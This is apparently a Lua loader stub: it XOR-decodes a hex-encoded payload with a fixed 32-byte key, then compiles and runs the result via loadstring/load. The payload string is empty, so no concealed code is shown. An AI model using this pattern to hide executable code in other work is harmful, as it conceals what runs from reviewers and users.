local k={214,172,90,79,168,5,128,19,70,129,106,103,137,252,146,132,29,146,17,62,76,105,243,243,222,22,14,245,79,157,132,27}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
return fn()
